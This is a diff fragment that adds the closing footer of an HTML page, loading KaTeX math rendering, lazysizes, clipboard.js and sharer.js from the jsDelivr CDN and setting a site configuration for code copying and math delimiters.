+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
